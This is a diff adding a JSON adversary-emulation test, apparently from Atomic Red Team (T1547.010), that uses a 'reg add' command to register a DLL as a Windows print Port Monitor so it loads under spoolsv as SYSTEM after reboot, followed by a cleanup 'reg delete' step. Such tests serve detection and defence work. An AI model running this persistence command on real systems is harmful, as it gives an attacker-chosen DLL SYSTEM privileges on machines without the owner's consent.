@@ -1,0 +1,52 @@
+{
+  "id": "d34ef297-f178-4462-871e-9ce618d44e50",
+  "name": "Add Port Monitor persistence in Registry",
+  "description": "Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "53371e1f-803d-4ad6-8273-b0882be806f4",
+      "type": "execute-command",
+      "data": {
+        "command": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /v \"Driver\" /d \"#{monitor_dll}\" /t REG_SZ /f\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d1401894-f7fa-4836-9069-58484cc806a1",
+      "type": "execute-command",
+      "data": {
+        "command": "reg delete \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /f \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "53371e1f-803d-4ad6-8273-b0882be806f4",
+      "p": "on-success",
+      "o": "d1401894-f7fa-4836-9069-58484cc806a1"
+    },
+    {
+      "s": "53371e1f-803d-4ad6-8273-b0882be806f4",
+      "p": "on-failure",
+      "o": "d1401894-f7fa-4836-9069-58484cc806a1"
+    }
+  ],
+  "tags": [
+    "T1547.010",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "monitor_dll",
+      "type": "path",
+      "description": "Addition to port monitor registry key. Normally refers to a DLL name in C:\\Windows\\System32 but an arbitrary DLL can be specified with the absolute path.",
+      "value": "$PathToAtomicsFolder\\T1547.010\\bin\\PortMonitor.dll"
+    }
+  ]
+}
